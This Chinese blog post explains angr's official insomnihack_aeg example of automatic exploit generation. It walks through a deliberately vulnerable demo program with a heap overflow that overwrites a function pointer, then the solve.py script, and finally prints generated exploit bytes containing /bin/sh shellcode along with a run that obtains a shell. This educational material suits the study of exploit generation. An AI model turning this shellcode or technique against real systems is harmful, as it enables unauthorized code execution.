---
title: "基于 Angr 的漏洞利用自动生成之缓冲区溢出案例分析"
date: 2020-02-13T09:39:11+08:00
draft: false
---
> 文章首发于 [先知社区](https://xz.aliyun.com/t/7199)

## 前言

本文将结合 angr 官方提供的示例 [insomnihack_aeg](https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg) 展示基于 angr 的简单自动利用生成，分析各个步骤并介绍相关接口。通过阅读本文，可以对 angr 和简单 AEG 有进一步的认识。

相关源文件在 [**insomnihack_aeg**](https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg) 中。

`demo_bin` 为二进制程序，`demo_bin.c` 为源代码，`solve.py` 是自动生成 exploit 的脚本



## 程序分析

首先分析一下程序源代码 [demo_bin.c](https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/demo_bin.c) ，该程序有一个明显缓冲区溢出。

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char component_name[128] = {0}; #buffer 大小为 128

typedef struct component {
    char name[32]; # length 只有 32，小于 128
    int (*do_something)(int arg);
} comp_t;

int sample_func(int x) {
    printf(" - %s - recieved argument %d\n", component_name, x);
}

comp_t *initialize_component(char *cmp_name) {
    int i = 0;
    comp_t *cmp;

    cmp = malloc(sizeof(struct component));
    cmp->do_something = sample_func;

    printf("Copying component name...\n"); 
    while (*cmp_name) 
        cmp->name[i++] = *cmp_name++; # 缓冲区溢出

    cmp->name[i] = '\0';
    return cmp;
}

int main(void)
{
    comp_t *cmp;

    printf("Component Name:\n");
    read(0, component_name, sizeof component_name);
    printf("Initializing component...\n");
    cmp = initialize_component(component_name);    
    printf("Running component...\n");
    cmp->do_something(1); # 调用函数
```

程序定义了结构体 `component`，包含两个成员变量，`char` 类型的 `name`, 长度为 32，还有函数指针 `do_something`。另外，定义了全局变量 `component_name`，长度为 128。通过 `read` 函数读取数据到 `component_name` 中，再拷贝到结构体的 `name` 中，**此时会造成堆溢出，可以覆盖函数指针**。

## 利用思路

该例子不考虑其他安全机制，可以直接在缓冲区存放 `shellcode`, 再修改函数指针为指向 `shellcode` 的地址，即可实现利用。

人工构造比较简单，接下来我们结合该程序分析自动利用的过程。



## 自动利用生成

常规上，自动利用生成分为以下几个步骤

1. 漏洞挖掘：通过符号执行探索程序路径，判断是否符合漏洞约束。通过该步骤，到达可利用状态或发生 Crash 
2. 可利用状态或 crash 分析：分析此时寄存器状态，内存布局
3. 设置利用约束：根据漏洞利用技术设定约束
4. 约束求解，生成 `exploit`：主要针对输入值进行求解

接下来我们结合 [solve.py](https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/solve.py)  脚本进行解读。

首先初始化项目

```python
 p = angr.Project(binary) 
 binary_name = os.path.basename(binary)
 extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY} # 设置 State 的选项
 es = p.factory.entry_state(add_options=extras)# 获得从入口点运行的 State
 sm = p.factory.simulation_manager(es, save_unconstrained=True) # 初始化simulation_manager
```

指定 `save_unconstrained` 选项为true，保存 无约束状态，存储在 unconstrained stash 中。

angr 中对于 `unconstrained` 状态的描述：

>  with the instruction pointer controlled by user data or some other source of symbolic data。

此外获得入口点状态时设置了 `REVERSE_MEMORY_NAME_MAP` 和 `TRACK_ACTION_HISTORY `选项。

- `REVERSE_MEMORY_NAME_MAP`: 保留内存地址的信息

> Maintain a mapping from symbolic variable name to which addresses it is present in, required for `memory.replace_all`

- `TRACK_ACTION_HISTORY`: 记录模拟执行状态的 ACTION 

> track the history of actions through a path (multiple states). 



### 漏洞挖掘及状态分析

```python
 # find a bug giving us control of PC
    l.info("looking for vulnerability in '%s'", binary_name)
    exploitable_state = None
    while exploitable_state is None:
        print(sm)
        sm.step() # Step a stash of states forward and categorize the successors appropriately. 
        if len(sm.unconstrained) > 0: # 找到未约束状态
            l.info("found some unconstrained states, checking exploitability")
            for u in sm.unconstrained:
                if fully_symbolic(u, u.regs.pc): #判断是否为可利用状态
                    exploitable_state = u #获得可利用状态
                    break

            # no exploitable state found, drop them
            sm.drop(stash='unconstrained') #删除 unconstrained stash 中的状态
```

```python
def fully_symbolic(state, variable): # 判断 state 的 variable 是否为符号化
    '''
    check if a symbolic variable is completely symbolic
    '''
    for i in range(state.arch.bits): #总共需要判断 arch.bits 位
        if not state.solver.symbolic(variable[i]): # 判断variable[i]是否为符号化
            return False
    return True
```

初始化项目之后，我们获得 `SM(Simulation Managers)`，不断调用 `sm.step()` 进行路径探索以找到无约束（`unconstrained`）状态，继而判断无约束状态是否可利用，即判断寄存器 pc 是否为符号值。若是，这代表我们可以控劫持控制流，该状态可利用，跳出循环。如果未约束状态无法利用，则调用 `drop` 接口移除状态，继续调用 `sm.step() `探索路径。



关于 `step()` 和 `drop()` 接口：

```python
step(stash='active', n=None, selector_func=None, step_func=None, successor_func=None, until=None, filter_func=None, **run_args) #单步执行 stash 中的 state, 默认 active
Step a stash of states forward and categorize the successors appropriately.

The parameters to this function allow you to control everything about the stepping and categorization process.
```

```python
drop(filter_func=None, stash='active') #移除stash 中的 state, 默认为 active 
Drops states from a stash. This is an alias for move(), with defaults for the stashes.
```

完成漏洞挖掘后，获得可利用状态 ep。

```python
ep = exploitable_state
assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"
```

### 构造利用约束

获得可利用状态后，我们根据利用技术构造利用约束，判断该状态是否满足。

首先调用 `find_symbolic_buffer` 获得 `symbolic buffer` 列表

```python
def find_symbolic_buffer(state, length): # 获得 symbolic buffer 列表。
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''
    # get all the symbolic bytes from stdin
    stdin = state.posix.stdin
    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('file', stdin.ident):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr
```

`state.solver.get_variables()` 获得内存中的符号变量。

>  `get_variables(*keys)`
>
> Iterate over all variables for which their tracking key is a prefix of the values provided.
>
> Elements are a tuple, the first element is the full tracking key, the second is the symbol.



`state.memory.addrs_for_name()` 返回包含符号变量的内存地址。

> `addrs_for_name`(*n*)
>
> Returns addresses that contain expressions that contain a variable named n.

`state.posix.stdin`为传入程序的全部符号变量



```python
def check_continuity(address, addresses, length): # 检查一段连续的地址空间是否为符号化
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''
    for i in range(length):
        if not address + i in addresses:
            return False
    return True
```

获得 `symolic_buffer` 思路思路：找出所有的符号地址，存在 `sym_addrs` 数组中，遍历数组中每一个地址 addr，判断与该地址相邻的地址是否在 `sym_addrs` 数组中。即`[addr,addr+length]` 区间的每个地址是否都在 `sym_addrs` 中，如是，则为一段连续的符号化空间，即 symbolic buffer。

```python
# keep checking if buffers can hold our shellcode
    for buf_addr in find_symbolic_buffer(ep, len(shellcode)): # 调用  find_symbolic_buffer 获得 symbolic buffer
        l.info("found symbolic buffer at %#x", buf_addr)
        memory = ep.memory.load(buf_addr, len(shellcode)) # 获取 buffer 
        sc_bvv = ep.solver.BVV(shellcode) #将 shellcode 转成 bitvector 类型
        # check satisfiability of placing shellcode into the address
        if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):
            l.info("found buffer for shellcode, completing exploit")
            ep.add_constraints(memory == sc_bvv) # 约束 1 
            l.info("pointing pc towards shellcode buffer")
            ep.add_constraints(ep.regs.pc == buf_addr) # 约束 2 
            break
    else:
        l.warning("couldn't find a symbolic buffer for our shellcode! exiting...")
        return 1
```

获得 `symbolic buffer` 列表后，判断其中的 buffer 是否满足利用约束，如果可以满足，则添加约束到 ep(可利用状态) ，最后进行约束求解。这里漏洞利用约束有两个:

1. 缓冲区可以存放 `shellcode` （` memory == sc_bvv`)
2. pc 值可以指向 `buffer` 地址(`ep.regs.pc == buf_addr`)

### 约束求解，生成 exploit 

```python
filename = '%s-exploit' % binary_name
with open(filename, 'wb') as f:
    f.write(ep.posix.dumps(0))
print("%s exploit in %s" % (binary_name, filename))
print("run with `(cat %s; cat -) | %s`" % (filename, binary))
return 0
```

`posix.dumps(0)`  即使用对标准输入（文件描述符为 0）进行约束求解，获得满足约束的输入值。

`posix.dumps(0)` 相当于：

```python
my_stdin_file = my_state.posix.files[0]              #stdin file descriptor
all_my_bytes = my_stdin_file.all_bytes()                  #all bytes in file
myBytesString = my_path.se.eval(all_my_bytes,cast_to=str) #Solve bytes, convert to string
```

最后会获得 `demo_bin-exploit` 文件，包含可以成功利用程序的输入。

### 测试

可以调用脚本的 `test()` 函数, 测试是否成功生成利用

```python
assert subprocess.check_output('(cat ./demo_bin-exploit; echo echo BUMO) | ./demo_bin', shell=True) == b'BUMO\n'
```



### 运行

接下来，我们可以看一下脚本的运行过程

`python solve.py demo_bin` 运行脚本

或者使用 ipdb 进行调试 

```
python -m ipdb solve.py demo_bin
```

调试命令与 gdb 类似，b 设置断点，c 继续运行，n 单步运行，s 步进

```python
ipdb> c    
<SimulationManager with 1 active>
> /home/angr/angr-doc/examples/insomnihack_aeg/solve.py(70)main()
     68         print(sm)
     69         sm.step()
2--> 70         if len(sm.unconstrained) > 0:
6    71             l.info("found some unconstrained states, checking exploitability")
     72             for u in sm.unconstrained:
```

我们查看 sm 中的状态，@ 后面为当前状态 eip 的值，即 `state.regs.eip`    

```python
ipdb> sm.active                                                                
[<SimState @ 0xc000048>, <SimState @ 0xc000048>, <SimState @ 0x80485a2>, <SimState @ 0x80484ce>, <SimState @ 0x90512d0>, <SimState @ 0x8048360>, <SimState @ 0x80484ad>, <SimState @ 0x8048592>, <SimState @ 0x9067b40>, <SimState @ 0x8048380>, <SimState @ 0x8048582>, <SimState @ 0x8048529>, <SimState @ 0x8048504>]
ipdb> sm.deadended    #deadended 存储无法继续执行的 state.
[<SimState @ 0xc000048>, <SimState @ 0xc000048>, <SimState @ 0xc000048>]
ipdb> sm.active[0]                                                             
<SimState @ 0xc000048>
```

找到 `unconstrained` 状态：

```python
ipdb> l                                                        
     66     exploitable_state = None
     67     while exploitable_state is None:
     68         print(sm)
     69         sm.step()
     70         if len(sm.unconstrained) > 0:
6--> 71             l.info("found some unconstrained states, checking exploitability")
     72             for u in sm.unconstrained:
3    73                 if fully_symbolic(u, u.regs.pc):
     74                     exploitable_state = u
     75                     break
     76 

ipdb> sm.unconstrained                                      
[<SimState @ <BV32 0x800 .. packet_0_stdin_81_1024[759:752] .. packet_0_stdin_81_1024[767:760]>>]
```

步进 `fully_symbolic` 函数，

```python
> /home/angr/angr-doc/examples/insomnihack_aeg/solve.py(20)fully_symbolic()
     18     '''
     19 
---> 20     for i in range(state.arch.bits):
     21         if not state.solver.symbolic(variable[i]):
     22             return False
ipdb> variable                                  
<BV32 0x800 .. packet_0_stdin_81_1024[759:752] .. packet_0_stdin_81_1024[767:760]>
```

到达可利用的状态，输出查看，`BV32 Reverse(packet_0_stdin_81_1024[767:736])` 为 eip 的值，完全符号化。 

```python
     80     l.info("found a state which looks exploitable")
4    81     ep = exploitable_state
     82 
---> 83     assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"
     84 
     85     l.info("attempting to create exploit based off state")
     86 
     87     # keep checking if buffers can hold our shellcode
     88     for buf_addr in find_symbolic_buffer(ep, len(shellcode)):

ipdb> ep                     
<SimState @ <BV32 Reverse(packet_0_stdin_81_1024[767:736])>>
```

接下来，获得 `symbolic buffer,` 访问 memory，设定利用约束

```python
> /home/angr/angr-doc/examples/insomnihack_aeg/solve.py(91)main()
     89         l.info("found symbolic buffer at %#x", buf_addr)
5    90         memory = ep.memory.load(buf_addr, len(shellcode))
---> 91         sc_bvv = ep.solver.BVV(shellcode)
     92 
     93         # check satisfiability of placing shellcode into the address

ipdb> memory                                                                     
<BV176 packet_0_stdin_81_1024[1023:848]>
```

输出获得 `buffer` 地址为 `0x804a060`

```python
ipdb> hex(buf_addr)                              
'0x804a060'
```

在 IDA 中查看，发现 `0x804A060` 为 `component_name` 地址。

```asm
.bss:0804A060 component_name  db    ? ;               ; DATA XREF: sample_func+D↑o
.bss:0804A060                                         ; main+1D↑o ...
.bss:0804A061                 db    ? ;
.bss:0804A062                 db    ? ;
.bss:0804A063                 db    ? ;
.bss:0804A064                 db    ? ;
.bss:0804A065                 db    ? ;
```

最后运行到约束求解。获得 `exploit` 部分，输出查看

```python
ipdb> ep.posix.dumps(0)                                                                   
b'jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01`\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

我们可以看到生成的 exploit 内容，即 `shellcode+padding+shellcode_addr` 

从而达到覆盖 `do_something` 函数指针为 `shellcode` 地址的目的。



### 验证 exploit

```python
(angr) angr@f6839fc38468:~/angr-doc/examples/insomnihack_aeg$ (cat ./demo_bin-exploit;  echo BUMO) | ./demo_bin # 获得 shell 后执行命令 echo BUMO
Component Name:
Initializing component...
Copying component name...
Running component...
 - BUMO #可以输出 BUMO
 - recieved argument 1
```

将 `demo_bin-exploit` 中的内容传给 `demo_bin` 程序即可 getshell，使用 `echo BUMO` 进行测试，发现成功进行利用。

##  总结

本文章结合官方示例粗略地展示了简单 AEG 的利用过程。该用例是简单的缓冲区溢出，首先通过符号执行获得未约束状态，再通过判断指令寄存器 pc 值来确定该状态是否可利用，寄存器pc为符号值代表可以劫持控制流。获得可利用状态后，构造利用约束，判断状态的可满足性，最后进行约束求解，生成 `exploit`。

如何根据漏洞类型恰当地设置路径约束/漏洞约束，探索程序 `crash`/可利用状态。并结合漏洞利用技术构造利用约束是解决此类问题的关键。

## 参考资料

1. http://angr.io/api-doc/

2. https://ma3k4h3d.top/2019/01/09/insomnihack-aeg/

3. https://www.reddit.com/r/securityCTF/comments/8nyft5/angr_posixdumps/

   

